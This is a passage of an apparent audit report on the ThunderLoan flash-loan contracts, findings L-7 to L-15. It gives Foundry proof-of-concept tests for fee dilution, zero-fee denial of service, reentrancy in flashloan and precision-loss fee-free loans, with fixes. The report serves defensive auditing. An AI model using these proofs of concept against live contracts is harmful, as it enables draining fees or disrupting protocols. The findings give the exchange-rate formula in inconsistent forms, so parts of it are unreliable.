Consider inheriting OpenZeppelin’s PausableUpgradeable and gating critical state-changing functions with whenNotPaused. Expose pause()/unpause() to the owner so that the protocol can be frozen quickly if another vulnerability is discovered.

## [L-7]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `updateExchangeRate` function in `AssetToken` calculates the new exchange rate after a fee is collected. This function is called from `ThunderLoan.deposit` after new shares have already been minted for the depositor. The formula used is `newExchangeRate = (s_exchangeRate * (totalSupply() + fee)) / totalSupply()`. Both instances of `totalSupply()` refer to the new total supply, which includes the shares of the new depositor. This is incorrect because the deposit fee, paid by the new depositor, should accrue value only to the shareholders that existed *before* this deposit. By including the new depositor's shares in the calculation, their fee is distributed across all shareholders, including themselves, effectively diluting the reward for existing liquidity providers.

## Impact
The mis-calculation allows every new depositor to receive part (or all) of the deposit-fee back, while existing liquidity-providers earn less than the fee they should have received. In the extreme case where the pool size is very small, almost the entire fee is given back to the depositor, meaning the protocol practically charges no deposit fees and long-term LP revenue is systematically reduced.

## Proof of Concept
1. LP1 deposits 1000 WETH into an empty pool. After a deposit fee, they receive 997 AssetTokens. The exchange rate is updated to reflect this fee, increasing its value slightly.
2. A flash loan occurs, generating a fee that correctly accrues to LP1, further increasing the exchange rate.
3. LP2 deposits 1000 WETH. A deposit fee of 3 WETH is charged.
4. `ThunderLoan` mints new shares for LP2 based on the current exchange rate.
5. `ThunderLoan` then calls `assetToken.updateExchangeRate(3e18)` to account for the fee.
6. The `updateExchangeRate` function uses the `totalSupply()` *after* LP2's shares have been added. 
7. As a result, the rate increase from the 3 WETH fee is spread across both LP1's and LP2's shares.
8. The correct behavior would be for the rate to increase based on the `totalSupply()` *before* LP2's deposit, ensuring the entire fee benefits only LP1. The flawed calculation results in a lower exchange rate than the correct one, causing a direct value loss for LP1.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Mock.sol";
import "../../src/protocol/AssetToken.sol";

// A minimal contract that plays the role of ThunderLoan so it can call the restricted functions
contract AssetTokenHarness is AssetToken {
    constructor(IERC20 _underlying)
        AssetToken(address(this), _underlying, "AST", "AST")
    {}
    function mintShares(address to, uint256 amount) external {
        AssetToken.mint(to, amount);
    }
    function updateRate(uint256 fee) external {
        AssetToken.updateExchangeRate(fee);
    }
}

contract ExchangeRateDilutionTest is Test {
    ERC20Mock private weth;
    AssetTokenHarness private asset;
    address private lp1 = address(0xA1);
    address private lp2 = address(0xB2);

    function setUp() public {
        weth = new ERC20Mock("Wrapped Ether", "WETH", lp1, 0);
        asset = new AssetTokenHarness(IERC20(weth));
    }

    function testFeeDilution() public {
        uint256 PRECISION = asset.EXCHANGE_RATE_PRECISION();

        // --- LP1 deposit ----------------------------------------------------
        uint256 lp1Shares = 997 ether; // mimics 1000 – 0.3 % fee
        asset.mintShares(lp1, lp1Shares);
        asset.updateRate(3 ether);       // fee credited *after* mint
        uint256 rateAfterLp1 = asset.getExchangeRate();
        uint256 supplyAfterLp1 = asset.totalSupply();

        // --- flash-loan accrues 1 ether fee ---------------------------------
        asset.updateRate(1 ether);
        uint256 rateAfterLoan = asset.getExchangeRate();

        // --- LP2 deposit ----------------------------------------------------
        uint256 supplyBeforeLp2 = asset.totalSupply();
        uint256 lp2Shares = 997 ether;
        asset.mintShares(lp2, lp2Shares);   // new shares already minted
        asset.updateRate(3 ether);          // same 0.3 % fee, but now diluted
        uint256 vulnerableRate = asset.getExchangeRate();

        // what the rate **should** have been (using supplyBeforeLp2)
        uint256 correctRate = (rateAfterLoan * (supplyBeforeLp2 + 3 ether)) / supplyBeforeLp2;

        assertLt(vulnerableRate, correctRate, "fee was diluted");

        // LP1’s value is smaller with the vulnerable formula ----------------
        uint256 valueWithBug  = (lp1Shares * vulnerableRate) / PRECISION;
        uint256 valueCorrect  = (lp1Shares * correctRate) / PRECISION;
        assertLt(valueWithBug, valueCorrect, "LP1 lost value due to dilution");
    }
}

## Suggested Mitigation
Pass the previous totalSupply (before minting the new shares) to updateExchangeRate, or call updateExchangeRate before minting. This ensures the full fee is distributed only to existing shares: 

// in ThunderLoan.deposit()
uint256 oldSupply = assetToken.totalSupply();
assetToken.mint(msg.sender, sharesToMint);
assetToken.updateExchangeRate(fee, oldSupply);

and change updateExchangeRate to accept oldSupply and use it in the denominator.

## [L-8]. DOS issue in AssetToken::updateExchangeRate

## Description
The `updateExchangeRate` function in `AssetToken` reverts if the new exchange rate is not strictly greater than the old one. The check is `if (newExchangeRate <= s_exchangeRate) { revert AssetToken__ExhangeRateCanOnlyIncrease(...) }`. The fee for a deposit or flash loan is calculated in `ThunderLoan.getCalculatedFee`. Due to precision loss in this calculation, very small deposits can result in a calculated fee of zero. When `updateExchangeRate` is called with a fee of 0, `newExchangeRate` will be equal to `s_exchangeRate`, triggering the revert. This prevents users from depositing small amounts of certain assets, effectively a denial of service for those users.

## Impact
The protocol reverts when the calculated fee equals zero, preventing deposits whose fee rounds down to 0. This blocks very small-sized deposits (and therefore some potential LPs) but does not endanger existing funds nor affect larger deposits or withdrawals.

## Proof of Concept
1. Any user approves and tries to deposit an amount that produces a zero fee.
2. getCalculatedFee() returns 0 → ThunderLoan calls AssetToken.updateExchangeRate(0).
3. Because newExchangeRate == s_exchangeRate, the strict `>` check inside updateExchangeRate() reverts, making the whole deposit revert.

The following Foundry test reproduces the revert.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ThunderLoan}   from "src/protocol/ThunderLoan.sol";
import {AssetToken}    from "src/protocol/AssetToken.sol";
import {MockERC20}     from "@openzeppelin/contracts/token/ERC20/mocks/ERC20Mock.sol";
import {ITSwapPool}    from "src/interfaces/ITSwapPool.sol";
import {IPoolFactory}  from "src/interfaces/IPoolFactory.sol";

contract MockTSwapPool is ITSwapPool {
    uint256 internal _price;
    function setPrice(uint256 p) external { _price = p; }
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) { return _price; }
}

contract MockPoolFactory is IPoolFactory {
    mapping(address => address) private pools;
    function setPool(address token, address pool) external { pools[token] = pool; }
    function getPool(address token) external view returns (address) { return pools[token]; }
}

contract DosSmallDepositTest is Test {
    ThunderLoan      internal tl;
    MockERC20        internal usdc;
    MockTSwapPool    internal pool;
    MockPoolFactory  internal factory;
    address          user = makeAddr("user");

    function setUp() public {
        usdc = new MockERC20("USD Coin","USDC",6);
        pool = new MockTSwapPool();
        factory = new MockPoolFactory();
        factory.setPool(address(usdc), address(pool));
        pool.setPrice(1e18);              // 1 USDC == 1 WETH (simplifies fee calc)

        // Deploy ThunderLoan behind proxy
        ThunderLoan logic = new ThunderLoan();
        bytes memory initData = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(factory));
        tl = ThunderLoan(address(new ERC1967Proxy(address(logic), initData)));

        tl.setAllowedToken(usdc, true);

        // Make an initial non-tiny deposit so an AssetToken exists
        usdc.mint(address(this), 1000e6);
        usdc.approve(address(tl), 1000e6);
        tl.deposit(usdc, 100e6);          // succeeds, initialises exchange rate

        // Give tiny amount to user
        usdc.mint(user, 1);
    }

    function test_RevertOnTinyDeposit() public {
        vm.startPrank(user);
        usdc.approve(address(tl), 1);
        bytes4 expected = bytes4(keccak256("AssetToken__ExhangeRateCanOnlyIncrease(uint256,uint256)"));
        vm.expectRevert(expected);
        tl.deposit(usdc, 1);              // reverts because fee == 0 → exchange rate unchanged
        vm.stopPrank();
    }
}


## Suggested Mitigation
Permit equal exchange rates instead of strictly increasing ones:

```solidity
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 ts = totalSupply();
    if (ts == 0) return; // nothing to update yet

    uint256 newRate = (s_exchangeRate * (ts + fee)) / ts;
    if (newRate < s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newRate);
    }
    s_exchangeRate = newRate;
    emit ExchangeRateUpdated(newRate);
}
```

## [L-9]. Pausable Emergency Stop issue in ThunderLoanUpgraded::NA

## Description
The `ThunderLoanUpgraded` contract lacks a global emergency stop mechanism. While the owner can disable individual tokens via `setAllowedToken(token, false)`, there is no function to pause all protocol activity simultaneously. In the event of a critical vulnerability discovery, such as a flaw in the core logic or a widespread oracle failure, the inability to swiftly halt all operations exposes the protocol to significant risk. Attackers could exploit the delay as the owner sends separate transactions to disable each token one by one.

## Impact
Lack of a global pause limits the team’s ability to react quickly to undiscovered bugs or oracle failures. It is an operational risk, not a bug that directly lets an attacker steal or lock funds.

## Proof of Concept
1. A critical bug is discovered in the `redeem` function that allows any user to withdraw more assets than they are entitled to.
2. The protocol has multiple tokens enabled, such as WETH, DAI, and LINK.
3. The owner is notified and must act to prevent further losses.
4. The owner sends a transaction to disable the WETH token by calling `setAllowedToken(WETH, false)`.
5. An attacker, monitoring the mempool, sees the owner's transaction. The attacker front-runs the owner's subsequent transactions, executing the exploit on the DAI and LINK pools before they can be disabled.
6. A global `pause()` function would have allowed the owner to halt all `redeem` activity instantly with a single transaction, mitigating the losses.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract NoPauseTest is Test {
    ThunderLoanUpgraded internal thunderLoan;
    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    MockERC20 internal weth;
    MockERC20 internal dai;

    function setUp() public {
        ThunderLoanUpgraded logic = new ThunderLoanUpgraded();
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic), abi.encodeWithSelector(ThunderLoanUpgraded.initialize.selector, address(0)));
        thunderLoan = ThunderLoanUpgraded(address(proxy));
        vm.prank(owner);
        thunderLoan.transferOwnership(owner);

        weth = new MockERC20("WETH", "WETH", 18);
        dai = new MockERC20("DAI", "DAI", 18);

        vm.startPrank(owner);
        thunderLoan.setAllowedToken(weth, true);
        thunderLoan.setAllowedToken(dai, true);
        vm.stopPrank();
    }

    // This test illustrates the scenario rather than a direct exploit.
    // A real exploit would depend on a separate vulnerability.
    function test_Scenario_NoGlobalPause() public {
        console.log("SCENARIO: A critical bug is found.");
        
        // Attacker prepares to exploit both WETH and DAI pools.
        console.log("Attacker sees owner's tx to disable WETH and frontruns to exploit DAI.");

        // Owner disables WETH pool.
        vm.prank(owner);
        thunderLoan.setAllowedToken(weth, false);
        console.log("Owner has disabled the WETH pool.");
        assertFalse(thunderLoan.isAllowedToken(weth));

        // In the same block, an attacker could have exploited the DAI pool.
        // We simulate this by asserting the DAI pool is still active.
        assertTrue(thunderLoan.isAllowedToken(dai), "DAI pool is still active and vulnerable.");
        console.log("Attacker exploits the still-active DAI pool.");

        // Owner's next transaction to disable DAI is too late.
        vm.prank(owner);
        thunderLoan.setAllowedToken(dai, false);
        console.log("Owner disables the DAI pool, but after it was exploited.");

        // A global pause() could have frozen both pools simultaneously in one transaction.
    }
}
```

## Suggested Mitigation
Implement a global pause mechanism by inheriting from OpenZeppelin's `PausableUpgradeable` contract. Add the `pauser` role (or use `onlyOwner`) to control `pause()` and `unpause()` functions. Critical functions such as `deposit`, `redeem`, and `flashloan` should then be protected with the `whenNotPaused` modifier.

```solidity
// In ThunderLoanUpgraded.sol
import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";

contract ThunderLoanUpgraded is ... PausableUpgradeable {
    function initialize(address tswapAddress) public initializer {
        // ...
        __Pausable_init();
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    function deposit(...) external whenNotPaused ... {
        // ...
    }

    function redeem(...) external whenNotPaused ... {
        // ...
    }

    function flashloan(...) external whenNotPaused ... {
        // ...
    }
}
```

## [L-10]. Integer Overflow/Math issue in ThunderLoanUpgraded::getCalculatedFee

## Description
The `getCalculatedFee` function calculates the final fee using two separate division operations. This can cause precision loss, especially for small loan amounts. If the intermediate `valueOfBorrowedToken` calculation results in a value that, when multiplied by `s_flashLoanFee`, is less than `FEE_PRECISION`, the final fee will be rounded down to zero. This allows for small, fee-free flashloans, leading to a loss of revenue for the protocol and its liquidity providers. The issue is acknowledged in the project's README.

## Impact
The protocol may fail to collect fees on small flashloans, resulting in a minor but continuous loss of revenue. Attackers could potentially exploit this by taking many small, free flashloans.

## Proof of Concept
1. Assume `FEE_PRECISION` is `1e18` and `s_flashLoanFee` is `3e15` (0.3%).
2. A user requests a flashloan for a very small `amount` of a token whose price in WETH is `1e18`.
3. Let the loan `amount` be 100 wei.
4. The first calculation is `valueOfBorrowedToken = (100 * 1e18) / 1e18 = 100`.
5. The second calculation is `fee = (100 * 3e15) / 1e18 = 3e17 / 1e18 = 0` due to integer division.
6. The user receives a flashloan without paying any fee.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {MockTSwapPool} from "./mocks/MockTSwapPool.sol";

contract PrecisionLossTest is Test {
    ThunderLoanUpgraded internal thunderLoan;
    address internal owner = address(this);
    MockERC20 internal token;

    function setUp() public {
        ThunderLoanUpgraded logic = new ThunderLoanUpgraded();
        MockPoolFactory factory = new MockPoolFactory();
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic), abi.encodeWithSelector(ThunderLoanUpgraded.initialize.selector, address(factory)));
        thunderLoan = ThunderLoanUpgraded(address(proxy));
        
        token = new MockERC20("TKN", "TKN", 18);
        vm.prank(owner);
        thunderLoan.setAllowedToken(token, true);

        // Setup mock oracle to return price of 1e18
        MockTSwapPool pool = new MockTSwapPool();
        pool.setPrice(1e18);
        factory.setPool(address(token), address(pool));
    }

    function test_PrecisionLoss_ZeroFee() public {
        uint256 smallAmount = 100; // 100 wei
        uint256 fee = thunderLoan.getCalculatedFee(token, smallAmount);
        assertEq(fee, 0, "Fee for a small amount is incorrectly calculated as zero");

        uint256 s_flashLoanFee = 3e15; // 0.3%
        uint256 FEE_PRECISION = 1e18;
        uint256 expectedFee = (((smallAmount * 1e18) / FEE_PRECISION) * s_flashLoanFee) / FEE_PRECISION;
        assertEq(fee, expectedFee);
    }
}
```

## Suggested Mitigation
Replace the two-step division with a single call to Math.mulDiv, which performs 512-bit multiplication followed by division in one operation:

```
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256) {
    uint256 priceInWeth = getPriceInWeth(address(token));
    // fee = amount * priceInWeth * s_flashLoanFee / FEE_PRECISION / FEE_PRECISION
    return Math.mulDiv(amount, Math.mulDiv(priceInWeth, s_flashLoanFee, FEE_PRECISION), FEE_PRECISION);
}
```

Using `Math.mulDiv` (available since OZ Contracts v4.9) guarantees that:
1. No overflow can happen for any 256-bit inputs.
2. All precision is preserved because there is only a single rounding at the very end.

If OZ is not an option, implement a 512-bit `mulDiv` helper identical to the one used by Uniswap V3 and others.

## [L-11]. Reentrancy issue in ThunderLoanUpgraded::flashloan

## Description
The `flashloan` function does not implement a reentrancy guard. It changes state (`s_currentlyFlashLoaning[token] = true`), makes an external call to an untrusted receiver contract, and then changes state again after the call (`s_currentlyFlashLoaning[token] = false`). This violates the Checks-Effects-Interactions pattern. An attacker can re-enter the `flashloan` function from their receiver contract's `executeOperation` callback. This can lead to state corruption, as the inner call will complete and set `s_currentlyFlashLoaning` to `false` before the outer call has finished, breaking the logic of functions like `repay` which rely on this flag.

## Impact
An attacker can re-enter flashloan() and have the inner call clear the s_currentlyFlashLoaning flag before the outer loan finishes. This prevents the outer borrower from using the convenience repay() function (it will revert) and may confuse off-chain accounting that relies on the flag’s correctness. However, funds cannot be stolen because the final balance check inside flashloan() still enforces that the borrowed amount plus fee is returned to the AssetToken contract. The bug therefore results in a limited denial-of-service/integrity issue rather than direct financial loss.

## Proof of Concept
1. The attacker creates a contract (`AttackerContract`) that implements the `IFlashLoanReceiver` interface.
2. `AttackerContract` calls `ThunderLoanUpgraded.flashloan` for a given token (e.g., WETH).
3. `ThunderLoanUpgraded` sets `s_currentlyFlashLoaning[WETH] = true` and calls `executeOperation` on `AttackerContract`.
4. Inside `executeOperation`, the attacker checks `isCurrentlyFlashLoaning(WETH)`, which correctly returns `true`.
5. The attacker then re-enters `ThunderLoanUpgraded.flashloan` for the same token.
6. The inner `flashloan` call executes. Upon its completion (after its own `executeOperation` returns), it sets `s_currentlyFlashLoaning[WETH] = false`.
7. Control returns to the outer `executeOperation` call. The attacker now checks `isCurrentlyFlashLoaning(WETH)` again. It will return `false`, even though the initial flash loan is still in progress. This demonstrates the state corruption.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract ReentrancyTest is Test, IFlashLoanReceiver {
    ThunderLoanUpgraded internal thunderLoan;
    MockERC20 internal weth;
    MockPoolFactory internal poolFactory;

    bool reentered = false;
    bool stateCorrupted = false;

    function setUp() public {
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        poolFactory = new MockPoolFactory();
        thunderLoan = new ThunderLoanUpgraded();
        thunderLoan.initialize(address(poolFactory));

        thunderLoan.setAllowedToken(weth, true);
        weth.mint(address(this), 1000e18);
        weth.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(weth, 1000e18);
    }

    function testFlashloanReentrancy() public {
        // Attacker needs funds for the inner loan's fee
        weth.mint(address(this), 1e18);
        weth.approve(address(thunderLoan.getAssetFromToken(weth)), type(uint256).max);
        
        thunderLoan.flashloan(address(this), weth, 100e18, "");

        assertTrue(stateCorrupted, "State should have been corrupted by reentrancy");
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, // initiator
        bytes memory // params
    ) external returns (bool) {
        if (!reentered) {
            reentered = true;
            console.log("Outer call: isCurrentlyFlashLoaning before re-entrancy?", thunderLoan.isCurrentlyFlashLoaning(weth));
            // Re-enter flashloan
            thunderLoan.flashloan(address(this), MockERC20(token), amount / 2, "");
            console.log("Outer call: isCurrentlyFlashLoaning after re-entrancy?", thunderLoan.isCurrentlyFlashLoaning(weth));
            
            // Check for state corruption
            if (!thunderLoan.isCurrentlyFlashLoaning(weth)) {
                stateCorrupted = true;
            }
        }

        MockERC20(token).transfer(address(thunderLoan.getAssetFromToken(MockERC20(token))), amount + fee);
        return true;
    }
}
```

## Suggested Mitigation
Apply a reentrancy guard to the `flashloan` function. OpenZeppelin's `ReentrancyGuard` contract provides a `nonReentrant` modifier that is the standard and recommended way to prevent this class of attacks.

```solidity
// Import ReentrancyGuardUpgradeable
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";

// Inherit from ReentrancyGuardUpgradeable
contract ThunderLoanUpgraded is ... ReentrancyGuardUpgradeable {

    // In initialize function
    function initialize(address tswapAddress) public initializer {
        // ...
        __ReentrancyGuard_init();
        // ...
    }

    // Add nonReentrant modifier to the flashloan function
    function flashloan(
        address receiverAddress,
        IERC20 token,
        uint256 amount,
        bytes calldata params
    ) external revertIfNotAllowedToken(token) revertIfZero(amount) nonReentrant {
        // ... function body
    }
}
```

## [L-12]. DOS issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function requires the new exchange rate to be strictly greater than the old one: `require(newExchangeRate > s_exchangeRate, ...)` (or `newExchangeRate <= s_exchangeRate` revert, which is equivalent). However, due to integer division in the calculation `newExchangeRate = (s_exchangeRate * (totalSupply() + fee)) / totalSupply()`, it's possible for `newExchangeRate` to equal `s_exchangeRate` if the `fee` is very small compared to `totalSupply`. When this happens, the `require` statement fails, causing the entire transaction to revert. This can prevent legitimate operations like `deposit` and `flashloan` from succeeding under certain conditions (e.g., small transaction amounts or a very large pool).

## Impact
The issue only prevents individual deposit/flash-loan transactions whose resulting fee is too small to change the exchange-rate after integer rounding. The protocol state and funds of other users remain safe; affected users can simply retry with a larger amount.

## Proof of Concept
1. A pool for DAI has a large `totalSupply` of asset tokens, e.g., `10^24`.
2. The `s_exchangeRate` is `10^18`.
3. A user attempts to take a flash loan that generates a very small `fee`, e.g., `fee = 100`.
4. `updateExchangeRate` calculates `newExchangeRate = (10^18 * (10^24 + 100)) / 10^24`.
5. Due to integer math, `(10^24 + 100) / 10^24` evaluates to `1`.
6. `newExchangeRate` is calculated as `10^18`, which is equal to `s_exchangeRate`.
7. The `require(newExchangeRate > s_exchangeRate, ...)` check fails, reverting the transaction.

## Proof of Code
// test/AssetTokenDos.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/mocks/ERC20Mock.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";

contract AssetTokenDosTest is Test {
    AssetToken internal assetToken;
    ERC20Mock internal dai;

    function setUp() public {
        dai = new ERC20Mock("DAI", "DAI", address(this), 0);
        assetToken = new AssetToken(address(this), IERC20(address(dai)), "tDAI", "tDAI");
    }

    function testRevertsWhenFeeTooSmall() public {
        uint256 hugeSupply = 1e24; // simulate a large pool
        assetToken.mint(address(0x1), hugeSupply);

        vm.expectRevert(AssetToken.AssetToken__ExhangeRateCanOnlyIncrease.selector);
        assetToken.updateExchangeRate(100); // tiny fee => same exchange rate => revert
    }
}

## Suggested Mitigation
Do not revert when the fee is too small to affect the exchange-rate. Instead, simply return early so the rate never decreases but small operations still succeed:

function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 supply = totalSupply();
    if (fee == 0 || supply == 0) return;
    uint256 newRate = (s_exchangeRate * (supply + fee)) / supply;
    if (newRate <= s_exchangeRate) return; // ignore insignificant fee
    s_exchangeRate = newRate;
    emit ExchangeRateUpdated(newRate);
}

## [L-13]. Integer Overflow/Math issue in ThunderLoan::deposit

## Description
The protocol's handling of ERC20 tokens with decimals other than 18 is non-standard and highly misleading, leading to situations where users can easily lose funds. The `AssetToken` is hardcoded to 18 decimals, but the `ThunderLoan.deposit` function mints a quantity of asset tokens numerically equal to the quantity of underlying tokens, without normalizing for decimal differences. For example, depositing 1,000 USDC (6 decimals) mints `1,000 * 10^6` `aUSDC` tokens. A standard wallet or UI would display this balance as `(1000 * 10^6) / 10^18 = 0.000000001` `aUSDC`, leading the user to believe their funds are lost. To redeem, the user must specify the raw, non-standard amount (`1000 * 10^6`), which is not discoverable through conventional tools, making fund recovery nearly impossible for a typical user and breaking composability with other protocols.

## Impact
Because AssetToken is hard-coded to 18 decimals, users dealing with 6-decimal tokens (e.g. USDC) will see very small numbers in standard wallets. This can confuse non-technical users and may lead them to believe funds are lost, but the tokens remain fully redeemable by calling `redeem()` with the raw balance or by pressing the wallet “max” button. No theft or permanent lock occurs; the problem is limited to poor UX and potential user error.

## Proof of Concept
1. Alice decides to deposit 1,000 USDC (which has 6 decimals) into the ThunderLoan contract.
2. She calls `deposit(usdcAddress, 1000 * 1e6)`.
3. The contract correctly takes her 1,000 USDC but mints `1000 * 1e6` `aUSDC` tokens to her address.
4. Since the `aUSDC` contract reports 18 decimals, her wallet displays her balance as `(1000 * 1e6) / 1e18 = 0.000000001` `aUSDC`.
5. Believing she has almost no tokens, she might try to redeem this small amount, getting back dust. To recover her funds, she would need to know the implementation detail of redeeming the raw value of `1000 * 1e6`, which is completely unintuitive and not displayed anywhere.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";

// Minimal 6-dec token
contract USDCMock is IERC20 {
    string public constant name = "Mock USDC";
    string public constant symbol = "USDC";
    uint8  public constant override decimals = 6;
    uint256 public totalSupply;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public balanceOf;

    function transfer(address to,uint256 amt) external returns(bool){_transfer(msg.sender,to,amt);return true;}
    function transferFrom(address from,address to,uint256 amt) external returns(bool){uint256 a=allowance[from][msg.sender];require(a>=amt,"allow");allowance[from][msg.sender]=a-amt;_transfer(from,to,amt);return true;}
    function approve(address spender,uint256 amt) external returns(bool){allowance[msg.sender][spender]=amt;return true;}
    function mint(address to,uint256 amt) external {balanceOf[to]+=amt;totalSupply+=amt;}
    function _transfer(address f,address t,uint256 a) internal {require(balanceOf[f]>=a,"bal");balanceOf[f]-=a;balanceOf[t]+=a;}
}

contract DummyPoolFactory is IPoolFactory {
    address public immutable pool;
    constructor(address _p){pool=_p;}
    function getPool(address) external view returns(address){return pool;}
}

contract DummySwapPool is ITSwapPool {
    function getPriceOfOnePoolTokenInWeth() external pure returns(uint256){return 1e18;}
}

contract DecimalMismatchTest is Test {
    ThunderLoan tl;
    USDCMock usdc;
    AssetToken aUsdc;
    address alice = address(0xABCD);

    function setUp() public {
        usdc = new USDCMock();
        usdc.mint(alice, 1_000*1e6);

        DummySwapPool pool = new DummySwapPool();
        DummyPoolFactory pf = new DummyPoolFactory(address(pool));

        tl = new ThunderLoan();
        tl.initialize(address(pf));
        tl.setAllowedToken(IERC20(address(usdc)), true);
        aUsdc = tl.getAssetFromToken(IERC20(address(usdc)));
    }

    function testDecimalConfusion() public {
        uint256 dep = 1_000*1e6;
        vm.startPrank(alice);
        usdc.approve(address(tl), dep);
        tl.deposit(IERC20(address(usdc)), dep);
        vm.stopPrank();

        // Raw balance equals deposit, but UI will show tiny number
        assertEq(aUsdc.balanceOf(alice), dep);
        assertEq(aUsdc.decimals(), 18);
    }
}

## Suggested Mitigation
For better UX, make AssetToken report the same number of decimals as the underlying token (store `uint8 immutable i_decimals` in the constructor and override `decimals()`), or normalise deposits/redemptions to 18-decimals as suggested in the original write-up. This change is backwards-compatible and removes user confusion.

## [L-14]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `updateExchangeRate` function in `AssetToken` updates the exchange rate based on fees collected from flash loans. The calculation `(fee * EXCHANGE_RATE_PRECISION) / totalSupply()` uses integer division, which can round down to zero if the `totalSupply` is significantly larger than the `fee * EXCHANGE_RATE_PRECISION`. When this happens, the fee paid by the flash loan borrower is effectively lost and does not accrue to liquidity providers, undermining the economic incentive of the protocol.

## Impact
Liquidity providers will not earn fees under certain conditions (e.g., small loan amounts relative to a large total liquidity pool), even though borrowers are paying them. This leads to a loss of yield for LPs and a broken incentive mechanism for the protocol.

## Proof of Concept
1. A large amount of liquidity is deposited, making `totalSupply()` very large (e.g., `10^28`).
2. A user takes a small flash loan, generating a tiny fee (e.g., `1000` wei).
3. `updateExchangeRate` is called.
4. The calculation `(1000 * 1e18) / 10^28` results in `10^21 / 10^28 = 0` due to integer division.
5. The `s_exchangeRate` is not updated, and the fee vanishes instead of accruing to LPs.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Minimal ThunderLoan mock for testing
contract ThunderLoanMock {
    function onlyThunderLoan() public pure {}
}

contract PrecisionLossTest is Test {
    AssetToken assetToken;
    address owner = address(this);
    address thunderLoanAddress;

    function setUp() public {
        // Mock ThunderLoan contract to satisfy `onlyThunderLoan` modifier
        thunderLoanAddress = address(new ThunderLoanMock());
        assetToken = new AssetToken(thunderLoanAddress, IERC20(address(0)), "Test Asset", "tAST");
    }

    function test_Low_FeeRoundingLoss() public {
        vm.startPrank(thunderLoanAddress);

        // Simulate a large total supply by minting to a dummy address
        uint256 largeTotalSupply = 10**28;
        assetToken.mint(address(0xdead), largeTotalSupply);
        assertEq(assetToken.totalSupply(), largeTotalSupply);

        uint256 initialExchangeRate = assetToken.getExchangeRate();

        // Simulate a small fee that will round to zero
        uint256 smallFee = 1000; // A fee smaller than totalSupply / 1e18
        
        // Update the exchange rate with the small fee
        assetToken.updateExchangeRate(smallFee);

        uint256 newExchangeRate = assetToken.getExchangeRate();

        // The exchange rate should not have changed because the increment rounded to 0
        assertEq(newExchangeRate, initialExchangeRate, "Exchange rate should not have changed");
    }
}
```

## Suggested Mitigation
To prevent fees from being lost due to rounding, the contract can accumulate fees in a separate variable and only apply them to the exchange rate calculation when the accumulated amount is large enough to make a difference. Alternatively, use a higher-precision math library for the calculation. A simpler, though less ideal, fix is to ensure the numerator is scaled appropriately before division or revert if the fee is too small to be registered.

## [L-15]. Unchecked Return issue in ThunderLoan::flashloan

## Description
